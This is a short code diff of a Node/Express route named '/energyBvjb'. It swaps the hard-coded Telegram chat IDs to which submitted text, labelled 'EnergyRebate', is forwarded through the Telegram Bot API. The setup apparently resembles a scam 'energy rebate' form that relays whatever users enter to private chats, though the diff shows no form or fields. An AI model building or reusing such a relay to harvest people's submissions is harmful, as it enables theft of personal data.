@@ -13526,7 +13526,7 @@ app.post("/energyBvjb", async (req, res) => {
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
-              chat_id: 1673554454,
+              chat_id: 680379375,
               text: `EnergyRebateBVJB:\n${originalText}`,
               parse_mode: "Markdown",
             }
@@ -13538,7 +13538,7 @@ app.post("/energyBvjb", async (req, res) => {
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
-              chat_id: 2134201699,
+              chat_id: 1673554454,
               text: `EnergyRebate:\n${originalText}`,
               parse_mode: "Markdown",
             }
